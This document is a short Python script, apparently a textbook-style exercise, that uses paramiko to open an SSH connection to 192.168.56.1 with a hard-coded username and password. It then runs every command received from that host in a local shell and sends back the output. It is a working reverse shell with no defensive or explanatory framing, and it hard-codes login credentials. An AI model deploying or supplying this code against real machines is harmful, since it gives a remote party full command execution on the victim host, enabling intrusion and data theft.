import paramiko
import threading
import subprocess

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username=user, password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print(ssh_session.recv(1024))
		while True:
			command = ssh_session.recv(1024)
			print(command)
			print(command.decode('utf-8'))
			try:
				cmd_output = subprocess.check_output(command.decode('utf-8'), shell=True)
				# cmd_output = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE)
				ssh_session.send(cmd_output)
			except Exception as e:
				ssh_session.send(str(e))
		client.close()

ssh_command("192.168.56.1", "justin", "lovesthepython", "ClientConnected")